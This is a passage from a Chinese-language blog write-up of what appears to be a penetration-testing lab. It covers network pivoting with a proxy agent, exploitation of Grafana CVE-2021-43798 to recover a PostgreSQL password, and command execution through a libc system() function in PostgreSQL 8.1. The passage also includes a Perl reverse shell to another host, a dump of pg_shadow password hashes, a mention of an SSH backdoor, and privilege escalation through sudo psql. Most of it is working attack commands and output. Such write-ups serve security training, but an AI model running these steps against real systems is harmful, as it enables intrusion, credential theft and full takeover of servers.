+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet6</span><span class="w"> </span><span class="n">fe80</span><span class="p">::</span><span class="n">216</span><span class="p">:</span><span class="n">3eff</span><span class="p">:</span><span class="n">fe13</span><span class="p">:</span><span class="n">6b80</span><span class="w">  </span><span class="n">prefixlen</span><span class="w"> </span><span class="n">64</span><span class="w">  </span><span class="n">scopeid</span><span class="w"> </span><span class="n">0x20</span><span class="o">&lt;</span><span class="n">link</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ether</span><span class="w"> </span><span class="n">00</span><span class="p">:</span><span class="n">16</span><span class="p">:</span><span class="n">3e</span><span class="p">:</span><span class="n">13</span><span class="p">:</span><span class="n">6b</span><span class="p">:</span><span class="n">80</span><span class="w">  </span><span class="n">txqueuelen</span><span class="w"> </span><span class="nf">1000</span><span class="w">  </span><span class="p">(</span><span class="n">Ethernet</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">148468</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">58106819</span><span class="w"> </span><span class="p">(</span><span class="n">58</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">MB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">frame</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">117490</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">20492549</span><span class="w"> </span><span class="p">(</span><span class="n">20</span><span class="p">.</span><span class="na">4</span><span class="w"> </span><span class="n">MB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">carrier</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">collisions</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">eth1</span><span class="p">:</span><span class="w"> </span><span class="n">flags</span><span class="o">=</span><span class="n">4163</span><span class="o">&lt;</span><span class="n">UP</span><span class="p">,</span><span class="n">BROADCAST</span><span class="p">,</span><span class="n">RUNNING</span><span class="p">,</span><span class="n">MULTICAST</span><span class="o">&gt;</span><span class="w">  </span><span class="n">mtu</span><span class="w"> </span><span class="n">1500</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">54</span><span class="p">.</span><span class="na">179</span><span class="w">  </span><span class="n">netmask</span><span class="w"> </span><span class="n">255</span><span class="p">.</span><span class="na">255</span><span class="p">.</span><span class="na">255</span><span class="p">.</span><span class="na">0</span><span class="w">  </span><span class="n">broadcast</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">54</span><span class="p">.</span><span class="na">255</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet6</span><span class="w"> </span><span class="n">fe80</span><span class="p">::</span><span class="n">216</span><span class="p">:</span><span class="n">3eff</span><span class="p">:</span><span class="n">fe00</span><span class="p">:</span><span class="n">e608</span><span class="w">  </span><span class="n">prefixlen</span><span class="w"> </span><span class="n">64</span><span class="w">  </span><span class="n">scopeid</span><span class="w"> </span><span class="n">0x20</span><span class="o">&lt;</span><span class="n">link</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ether</span><span class="w"> </span><span class="n">00</span><span class="p">:</span><span class="n">16</span><span class="p">:</span><span class="n">3e</span><span class="p">:</span><span class="n">00</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="n">08</span><span class="w">  </span><span class="n">txqueuelen</span><span class="w"> </span><span class="nf">1000</span><span class="w">  </span><span class="p">(</span><span class="n">Ethernet</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">5221</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">2442441</span><span class="w"> </span><span class="p">(</span><span class="n">2</span><span class="p">.</span><span class="na">4</span><span class="w"> </span><span class="n">MB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">frame</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">4640</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">1419394</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">.</span><span class="na">4</span><span class="w"> </span><span class="n">MB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">carrier</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">collisions</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lo</span><span class="p">:</span><span class="w"> </span><span class="n">flags</span><span class="o">=</span><span class="n">73</span><span class="o">&lt;</span><span class="n">UP</span><span class="p">,</span><span class="n">LOOPBACK</span><span class="p">,</span><span class="n">RUNNING</span><span class="o">&gt;</span><span class="w">  </span><span class="n">mtu</span><span class="w"> </span><span class="n">65536</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">  </span><span class="n">netmask</span><span class="w"> </span><span class="n">255</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet6</span><span class="w"> </span><span class="p">::</span><span class="n">1</span><span class="w">  </span><span class="n">prefixlen</span><span class="w"> </span><span class="n">128</span><span class="w">  </span><span class="n">scopeid</span><span class="w"> </span><span class="n">0x10</span><span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">loop</span><span class="w">  </span><span class="n">txqueuelen</span><span class="w"> </span><span class="nf">1000</span><span class="w">  </span><span class="p">(</span><span class="n">Local</span><span class="w"> </span><span class="n">Loopback</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">2446</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">208088</span><span class="w"> </span><span class="p">(</span><span class="n">208</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">KB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">frame</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">2446</span><span class="w">  </span><span class="n">bytes</span><span class="w"> </span><span class="nf">208088</span><span class="w"> </span><span class="p">(</span><span class="n">208</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">KB</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TX</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">dropped</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="n">overruns</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">carrier</span><span class="w"> </span><span class="n">0</span><span class="w">  </span><span class="n">collisions</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span></code></pre></div><p>配置代理：</p>
+<p>靶机二：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">linux_x64_agent</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">靶机一ip</span><span class="p">:</span><span class="n">8888</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">123</span><span class="w">
+</span></span></span></code></pre></div><p>本机：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">(</span><span class="n">node</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">listen</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[*]</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">choose</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nf">mode</span><span class="p">(</span><span class="n">1</span><span class="p">.</span><span class="na">Normal</span><span class="w"> </span><span class="n">passive</span><span class="o">/</span><span class="n">2</span><span class="p">.</span><span class="na">IPTables</span><span class="w"> </span><span class="n">Reuse</span><span class="o">/</span><span class="n">3</span><span class="p">.</span><span class="na">SOReuse</span><span class="p">):</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[*]</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">[</span><span class="n">ip</span><span class="p">:</span><span class="o">]&lt;</span><span class="n">port</span><span class="o">&gt;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">8888</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[*]</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="nf">8888</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">node</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[*]</span><span class="w"> </span><span class="n">New</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">come</span><span class="o">!</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">node</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">back</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">admin</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">detail</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Node</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">IP</span><span class="p">:</span><span class="w"> </span><span class="n">39</span><span class="p">.</span><span class="na">101</span><span class="p">.</span><span class="na">163</span><span class="p">.</span><span class="na">3</span><span class="p">:</span><span class="n">9999</span><span class="w">  </span><span class="n">Hostname</span><span class="p">:</span><span class="w"> </span><span class="n">web01</span><span class="w">  </span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="n">hacker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Node</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">IP</span><span class="p">:</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">12</span><span class="p">.</span><span class="na">236</span><span class="p">:</span><span class="n">53536</span><span class="w">  </span><span class="n">Hostname</span><span class="p">:</span><span class="w"> </span><span class="n">web03</span><span class="w">  </span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="n">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">socks</span><span class="w"> </span><span class="n">6666</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515905.png" alt="image.png"></p>
+<h2 id="web4-grafana">web4 <strong>Grafana</strong></h2>
+<p>需要利用 CVE-2021-43798 漏洞获取到数据库文件（/var/lib/grafana/grafana.db）以及存在解密密钥的配置文件（/etc/grafana/grafana.ini），然后进行解密。</p>
+<p>使用 <a href="https://github.com/A-D-Team/grafanaExp">A-D-Team/grafanaExp</a> 可以一键利用漏洞解密输出 data_souce 信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">root</span><span class="nd">@web03</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">grafanaExp_linux_amd64</span><span class="w"> </span><span class="n">exp</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//172.30.54.12:3000</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2023</span><span class="o">/</span><span class="n">12</span><span class="o">/</span><span class="n">29</span><span class="w"> </span><span class="n">17</span><span class="p">:</span><span class="n">41</span><span class="p">:</span><span class="n">34</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">plugin</span><span class="w"> </span><span class="o">[</span><span class="n">alertlist</span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2023</span><span class="o">/</span><span class="n">12</span><span class="o">/</span><span class="n">29</span><span class="w"> </span><span class="n">17</span><span class="p">:</span><span class="n">41</span><span class="p">:</span><span class="n">34</span><span class="w"> </span><span class="n">Got</span><span class="w"> </span><span class="n">secret_key</span><span class="w"> </span><span class="o">[</span><span class="n">SW2YcwTIb9zpOOhoPsMm</span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2023</span><span class="o">/</span><span class="n">12</span><span class="o">/</span><span class="n">29</span><span class="w"> </span><span class="n">17</span><span class="p">:</span><span class="n">41</span><span class="p">:</span><span class="n">34</span><span class="w"> </span><span class="n">There</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="n">records</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2023</span><span class="o">/</span><span class="n">12</span><span class="o">/</span><span class="n">29</span><span class="w"> </span><span class="n">17</span><span class="p">:</span><span class="n">41</span><span class="p">:</span><span class="n">34</span><span class="w"> </span><span class="n">type</span><span class="p">:</span><span class="o">[</span><span class="n">postgres</span><span class="o">]</span><span class="w">     </span><span class="n">name</span><span class="p">:</span><span class="o">[</span><span class="n">PostgreSQL</span><span class="o">]</span><span class="w">               </span><span class="n">url</span><span class="p">:</span><span class="o">[</span><span class="n">localhost</span><span class="p">:</span><span class="n">5432</span><span class="o">]</span><span class="w">    </span><span class="n">user</span><span class="p">:</span><span class="o">[</span><span class="n">postgres</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="o">[</span><span class="n">Postgres</span><span class="nd">@123</span><span class="o">]</span><span class="n">database</span><span class="p">:</span><span class="o">[</span><span class="n">postgres</span><span class="o">]</span><span class="w">      </span><span class="n">basic_auth_user</span><span class="p">:</span><span class="o">[]</span><span class="w">      </span><span class="n">basic_auth_password</span><span class="p">:</span><span class="o">[]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2023</span><span class="o">/</span><span class="n">12</span><span class="o">/</span><span class="n">29</span><span class="w"> </span><span class="n">17</span><span class="p">:</span><span class="n">41</span><span class="p">:</span><span class="n">34</span><span class="w"> </span><span class="n">All</span><span class="w"> </span><span class="n">Done</span><span class="p">,</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">nice</span><span class="w"> </span><span class="n">day</span><span class="o">!</span><span class="w">
+</span></span></span></code></pre></div><p>使用账号密码 <code>postgres:Postgres@123</code> 登录 PostgreSQL 数据库：</p>
+<pre tabindex="0"><code>root@kali-server:~# export PGPASSWORD=Postgres@123
+root@kali-server:~# proxychains4 -q psql -h 172.30.54.12 -U postgres -W
+psql (16.1 (Debian 16.1-1), server 8.1.0)
+WARNING: psql major version 16, server major version 8.1.
+         Some psql features might not work.
+Type &#34;help&#34; for help.
+
+postgres=# select version();
+                                                 version
+---------------------------------------------------------------------------------------------------------
+ PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+(1 row)
+
+postgres=# SHOW is_superuser;
+ is_superuser
+--------------
+ on
+(1 row)
+
+postgres=# select usename, passwd from pg_shadow;
+ usename  |               passwd
+----------+-------------------------------------
+ root     | md5da974531914a7c2c56df745574a5bd3a
+ postgres | md5dd27d33705155fd675e498384ad3d2ea
+(2 rows)
+
+postgres=# SELECT name,setting,source FROM pg_settings WHERE name = &#39;password_encryption&#39;;
+        name         | setting | source
+---------------------+---------+---------
+ password_encryption | on      | default
+(1 row)
+</code></pre><p>PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">postgres</span><span class="o">=</span><span class="err">#</span><span class="w"> </span><span class="n">CREATE</span><span class="w"> </span><span class="n">OR</span><span class="w"> </span><span class="n">REPLACE</span><span class="w"> </span><span class="n">FUNCTION</span><span class="w"> </span><span class="nf">system</span><span class="w"> </span><span class="p">(</span><span class="n">cstring</span><span class="p">)</span><span class="w"> </span><span class="n">RETURNS</span><span class="w"> </span><span class="n">integer</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="na">so</span><span class="p">.</span><span class="na">6</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="w"> </span><span class="n">LANGUAGE</span><span class="w"> </span><span class="sc">&#39;c&#39;</span><span class="w"> </span><span class="n">STRICT</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">postgres</span><span class="o">=</span><span class="err">#</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">curl</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">54</span><span class="p">.</span><span class="na">179</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">system</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--------</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">1</span><span class="w"> </span><span class="n">row</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">postgres</span><span class="o">=</span><span class="err">#</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">\&#39;</span><span class="n">use</span><span class="w"> </span><span class="n">Socket</span><span class="p">;</span><span class="n">$i</span><span class="o">=</span><span class="s">&#34;172.30.54.179&#34;</span><span class="p">;</span><span class="n">$p</span><span class="o">=</span><span class="n">2333</span><span class="p">;</span><span class="n">socket</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">PF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="n">getprotobyname</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">sockaddr_in</span><span class="p">(</span><span class="n">$p</span><span class="p">,</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">$i</span><span class="p">)))){</span><span class="n">open</span><span class="p">(</span><span class="n">STDIN</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDOUT</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">open</span><span class="p">(</span><span class="n">STDERR</span><span class="p">,</span><span class="s">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="n">exec</span><span class="p">(</span><span class="s">&#34;/bin/sh -i&#34;</span><span class="p">);};</span><span class="err">\&#39;&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">system</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--------</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">512</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">1</span><span class="w"> </span><span class="n">row</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>这里还需要给postgresql的root用户进行修改密码的操作，为了方便后面提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ALTER USER root WITH PASSWORD <span class="s1">&#39;123456&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><p>我先在web3写了个ssh后门，然后通过nc监听：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvp</span><span class="w"> </span><span class="n">2333</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">54</span><span class="p">.</span><span class="na">179</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">web03</span><span class="w"> </span><span class="n">2333</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Connection</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">54</span><span class="p">.</span><span class="na">12</span><span class="w"> </span><span class="n">56402</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">tty</span><span class="p">;</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">turned</span><span class="w"> </span><span class="n">off</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="kn">import</span><span class="w"> </span><span class="nn">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="na">spawn</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">)</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">postgres</span><span class="nd">@web04</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">pgsql</span><span class="o">/</span><span class="n">data$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">web04</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span><span class="w">
+</span></span></span></code></pre></div><p>这里有坑，一：需要输入刚才的 root 的密码，二：需要把得到的shel升为交互式shell：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><p>通过sudo -l 提权：<a href="https://gtfobins.github.io/gtfobins/psql/">https://gtfobins.github.io/gtfobins/psql/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql
+</span></span><span class="line"><span class="cl"><span class="se">\?</span>
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251516710.png" alt="image.png"></p>
+
+    </article>
+
+    
+    <div class="comments">
+  <div class="giscus"></div>
+</div>
+<script 
+  src="https://giscus.app/client.js" 
+  data-repo="dlzmoe/blog" 
+  data-repo-id="R_kgDOJkJvtw"
+  data-category="Announcements" 
+  data-category-id="DIC_kwDOJkJvt84CX9d6" 
+  data-mapping="url" 
+  data-strict="0"
+  data-reactions-enabled="1" 
+  data-emit-metadata="1" 
+  data-input-position="top" 
+  data-theme="light_protanopia"
+  data-lang="zh-CN" 
+  data-loading="lazy" 
+  crossorigin="anonymous" 
+  async>
+</script>
+
+    
+    
+  </section>
+  <footer class="footer">
+  <p>© 2024 - 2024 Powered by
+    <a href="https://github.com/w0s1np" target="_blank">Github</a>
